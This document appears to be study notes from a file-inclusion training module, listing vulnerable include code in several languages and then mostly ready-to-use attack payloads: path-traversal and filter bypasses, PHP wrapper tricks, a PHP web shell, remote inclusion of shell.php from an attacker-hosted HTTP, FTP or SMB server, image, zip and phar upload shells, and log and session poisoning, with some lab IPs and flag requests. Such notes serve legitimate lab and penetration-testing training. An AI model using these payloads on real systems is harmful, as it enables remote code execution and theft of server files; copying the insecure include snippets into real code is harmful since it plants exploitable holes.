# Intro to File Inclusions 

**PHP FILE INCLUSION FUNCTIONS**

```
include()
include_once()
require()
require_once()
file_get_contents()
fopen()
file()
```

**NODEJS FILE ACCESS FUNCTIONS**

```
fs.readFile()
fs.sendFile()
res.render()
```

**JAVA FILE INCLUSION FUNCTIONS**

```
include
import
```

**.NET FILE INCLUSION FUNCTIONS**

```
@Html.Partial()
@Html.RemotePartial()
Response.WriteFile()
include
```

**PHP VULNERABLE CODE SNIPPET**

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

**NODEJS VULNERABLE CODE SNIPPET**

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

**NODEJS EXPRESS RENDER SNIPPET**

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

**JAVA JSP INCLUDE SNIPPET**

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

**JAVA JSP IMPORT SNIPPET**

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

**.NET RESPONSE WRITEFILE SNIPPET**

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

**.NET HTML PARTIAL SNIPPET**

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

**.NET INCLUDE DIRECTIVE**

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

**EXAMPLE HTTP PARAMETERS**

```
/index.php?page=about
?language=es
/about/en
/about/es
```

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |


# LFI Attacker Workflow (added)

**COMMON LFI PARAMETERS**

```text
?page=
?file=
?path=
?template=
?view=
?include=
?language=
?lang=
?doc=
?folder=
?root=
```

**COMMON LFI ENDPOINT PATTERNS**

```text
/index.php?page=
/index.php?file=
/index.php?language=
/index.php?view=
/index.php?template=
/index.php?include=
/index.php?path=
```

**COMMON PATH TRAVERSAL PAYLOADS**

```text
../
../../
../../../
../../../../
../../../../../
../../../../../../
```

**LINUX SENSITIVE FILE TARGETS**

```text
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/version
/proc/self/cmdline
```

**WINDOWS SENSITIVE FILE TARGETS**

```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
```

**COMMON LFI TEST REQUESTS**

```text
/index.php?page=../../../../etc/passwd
/index.php?file=../../../../etc/passwd
/index.php?language=../../../../etc/passwd
/index.php?view=../../../../etc/passwd
/index.php?template=../../../../etc/passwd
```

---

# Local File Inclusion (LFI) 

**TARGET URLS**

```text
http://<SERVER_IP>:<PORT>/
http://<SERVER_IP>:<PORT>/index.php?language=es.php
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
http://<SERVER_IP>:<PORT>/extension/index.php?language=/etc/passwd
```

**PARAMETERS**

```text
language
```

**FILES AND PATHS**

```text
/etc/passwd
C:\Windows\boot.ini
./languages/
../index.php
../../../../etc/passwd
../../../etc/passwd
/../../../etc/passwd
/var/www/html/languages/
/var/www/html/index.php
/
index.php
/profile/$username/avatar.png
/usr/share/flags/flag.txt
```

**PHP VULNERABLE CODE**

```php
include($_GET['language']);
```

**PHP DIRECTORY APPEND CODE**

```php
include("./languages/" . $_GET['language']);
```

**PHP PREFIX APPEND CODE**

```php
include("lang_" . $_GET['language']);
```

**PHP EXTENSION APPEND CODE**

```php
include($_GET['language'] . ".php");
```

**PATH TRAVERSAL PAYLOADS**

```text
../
../../../
../../../../
/../../../etc/passwd
../../../../etc/passwd
../../../etc/passwd
```

**SECOND-ORDER LFI PAYLOADS**

```text
../../../etc/passwd
/profile/$username/avatar.png
```

**QUESTION TARGETS**

```text
154.57.164.75:30791
/usr/share/flags
flag.txt
```

```
http://154.57.164.75:30791/index.php?language=../../../../../../usr/share/flags/flag.txt
```
# Basic Bypasses 

**PHP FILTER SNIPPETS**

```php
$language = str_replace('../', '', $_GET['language']);
```

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

**LFI TEST URLS**

```text
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

**RECURSIVE TRAVERSAL PAYLOADS**

```text
....//
..././
....\/
....////
```

**URL-ENCODED PAYLOADS**

```text
%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

**APPROVED PATH PAYLOADS**

```text
./languages/../../../../etc/passwd
```

**PATH TRUNCATION PAYLOAD**

```url
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

**PATH TRUNCATION GENERATION COMMAND**

```shellsession
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

**NULL BYTE PAYLOAD**

```text
/etc/passwd%00
/etc/passwd%00.php
```

**FILES AND PATHS**

```text
/etc/passwd
/flag.txt
./languages/
.php
/etc/passwd/.
/etc/passwd
////etc/passwd
/etc/./passwd
```

**TOOLS**

```text
Burp Suite Decoder
online URL encoder utility
```


# PHP Filters 

**FUZZING FOR PHP FILES**

```shellsession
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

**STANDARD LFI REQUEST**

```text
http://<SERVER_IP>:<PORT>/index.php?language=config
```

**PHP FILTER PAYLOAD**

```text
php://filter/read=convert.base64-encode/resource=config
```

**PHP FILTER LFI REQUEST**

```text
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

**BASE64 DECODE COMMAND**

```shellsession
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

**PHP WRAPPER SCHEME**

```text
php://filter/
```

**FILTER PARAMETERS**

```text
read
resource
```

**FILTER TYPE USED**

```text
convert.base64-encode
```

**FILES**

```text
index.php
config.php
```

**WORDLIST**

```text
/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

**TOOLS**

```text
ffuf
base64
```

---


# PHP Wrappers 

**PHP CONFIGURATION FILE PATHS**

```text
/etc/php/X.Y/apache2/php.ini
/etc/php/X.Y/fpm/php.ini
/etc/php/7.4/apache2/php.ini
```

**PHP FILTER PAYLOAD**

```text
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

**CURL REQUEST TO READ PHP.INI**

```shellsession
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

**BASE64 DECODE AND GREP**

```shellsession
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

**PHP WEB SHELL**

```php
<?php system($_GET["cmd"]); ?>
```

**BASE64 ENCODE COMMAND**

```shellsession
echo '<?php system($_GET["cmd"]); ?>' | base64
```

**BASE64-ENCODED WEB SHELL**

```text
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**DATA WRAPPER PAYLOAD**

```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
```

**DATA WRAPPER REQUEST**

```text
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

**DATA WRAPPER CURL REQUEST**

```shellsession
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

**INPUT WRAPPER REQUEST**

```shellsession
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

**INPUT WRAPPER**

```text
php://input
```

**STATIC PHP COMMAND EXAMPLE**

```php
<?php system('id')?>
```

**EXPECT CHECK**

```shellsession
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

**EXPECT WRAPPER REQUEST**

```shellsession
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

**EXPECT WRAPPER**

```text
expect://id
```

**PARAMETERS**

```text
language
cmd
allow_url_include
expect
resource
read
```

**FILES AND PATHS**

```text
/
```

**TOOLS**

```text
curl
Burp
base64
grep
```

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20/
```

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt
```

# Remote File Inclusion (RFI) 

**RFI-CAPABLE FUNCTIONS**

```text
include()
include_once()
file_get_contents()
import
@Html.RemotePartial()
include
```

**VERIFY RFI**

```shellsession
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

```text
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

**WEB SHELL**

```shellsession
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```php
<?php system($_GET["cmd"]); ?>
```

**HTTP**

```shellsession
sudo python3 -m http.server <LISTENING_PORT>
```

```text
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

**FTP**

```shellsession
sudo python -m pyftpdlib -p 21
```

```text
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

```shellsession
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

**SMB**

```shellsession
impacket-smbserver -smb2support share $(pwd)
```

```text
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

**PATHS AND PARAMETERS**

```text
http://127.0.0.1:80/index.php
shell.php
\\<OUR_IP>\share\shell.php
language
cmd
/
```

**TOOLS AND SERVICES**

```text
curl
base64
grep
python3 -m http.server
pyftpdlib
impacket-smbserver
HTTP
FTP
SMB
```

```
http://10.129.29.114/index.php?language=http://10.10.14.134:8000/shell.php&cmd=ls%20/
```

```
http://10.129.29.114/index.php?language=http://10.10.14.134:8000/shell.php&cmd=cat%20/exercise/flag.txt
```

# LFI and File Uploads 

**PHP EXECUTION-CAPABLE FUNCTIONS**

```text
include()
include_once()
require()
require_once()
res.render()
import
include
```

**MALICIOUS IMAGE WEB SHELL**

```shellsession
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```php
GIF8<?php system($_GET["cmd"]); ?>
```

**UPLOADED FILE PATH**

```text
/profile_images/shell.gif
```

**HTML IMAGE REFERENCE**

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**LFI EXECUTION REQUEST**

```text
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

**ZIP WRAPPER PAYLOAD CREATION**

```shellsession
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**ZIP WRAPPER REQUEST**

```text
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

**PHAR PAYLOAD SCRIPT**

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

**PHAR BUILD COMMAND**

```shellsession
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

**PHAR WRAPPER REQUEST**

```text
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

**FILES AND PATHS**

```text
shell.gif
shell.php
shell.jpg
shell.phar
shell.txt
/profile_images/
/
```

**PARAMETERS**

```text
language
cmd
```

**TOOLS**

```text
zip
php
```

```
http://154.57.164.66:31714/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
```

# Log Poisoning 

**EXECUTION-CAPABLE FUNCTIONS**

```text
include()
include_once()
require()
require_once()
res.render()
import
include
```

**SESSION FILE PATHS**

```text
/var/lib/php/sessions/
C:\Windows\Temp\
```

**SESSION FILE FORMAT**

```text
/var/lib/php/sessions/sess_<PHPSESSID>
```

**SESSION FILE EXAMPLE**

```text
/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

**READ SESSION FILE**

```text
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

**CONTROL SESSION VALUE**

```text
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

**URL-ENCODED PHP WEB SHELL**

```text
%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

**SESSION POISONING PAYLOAD**

```text
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

**EXECUTE COMMAND THROUGH SESSION FILE**

```text
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

**APACHE LOG PATHS**

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
C:\xampp\apache\logs\
```

**NGINX LOG PATHS**

```text
/var/log/nginx/access.log
/var/log/nginx/error.log
C:\nginx\log\
```

**READ SERVER LOG**

```text
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

**USER-AGENT WEB SHELL**

```php
<?php system($_GET['cmd']); ?>
```

**USER-AGENT HEADER FILE**

```shellsession
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
```

**POISON LOG WITH CURL**

```shellsession
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

**EXECUTE COMMAND THROUGH LOG**

```text
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

**PROC FILE TARGETS**

```text
/proc/self/environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/fd/3
/proc/self/fd/4
/proc/self/fd/5
/proc/self/fd/6
/proc/self/fd/7
/proc/self/fd/8
/proc/self/fd/9
/proc/self/fd/10
/proc/self/fd/11
/proc/self/fd/12
/proc/self/fd/13
/proc/self/fd/14
/proc/self/fd/15
/proc/self/fd/16
/proc/self/fd/17
/proc/self/fd/18
/proc/self/fd/19
/proc/self/fd/20
/proc/self/fd/21
/proc/self/fd/22
/proc/self/fd/23
/proc/self/fd/24
/proc/self/fd/25
/proc/self/fd/26
/proc/self/fd/27
/proc/self/fd/28
/proc/self/fd/29
/proc/self/fd/30
/proc/self/fd/31
/proc/self/fd/32
/proc/self/fd/33
/proc/self/fd/34
/proc/self/fd/35
/proc/self/fd/36
/proc/self/fd/37
/proc/self/fd/38
/proc/self/fd/39
/proc/self/fd/40
/proc/self/fd/41
/proc/self/fd/42
/proc/self/fd/43
/proc/self/fd/44
/proc/self/fd/45
/proc/self/fd/46
/proc/self/fd/47
/proc/self/fd/48
/proc/self/fd/49
/proc/self/fd/50
```

**OTHER LOG TARGETS**

```text
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
```

**PARAMETERS**

```text
language
cmd
PHPSESSID
```

**TOOLS**

```text
curl
Burp Suite
```


# 
#
#


